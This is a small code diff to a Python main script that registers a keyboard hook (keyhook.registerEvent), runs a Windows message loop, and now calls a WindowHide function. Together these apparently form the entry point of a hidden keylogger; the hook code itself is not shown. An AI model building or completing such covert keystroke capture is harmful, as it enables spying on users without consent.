@@ -1,11 +1,11 @@
 import pythoncom
 from keyhook import registerEvent
-from poe import globals_init
+from winfo import WindowHide
 
 def main():
-    globals_init()
+    WindowHide()
     registerEvent()
     pythoncom.PumpMessages() 
 
-if __name__ == "__main__":     
+if __name__ == "__main__":
     main()
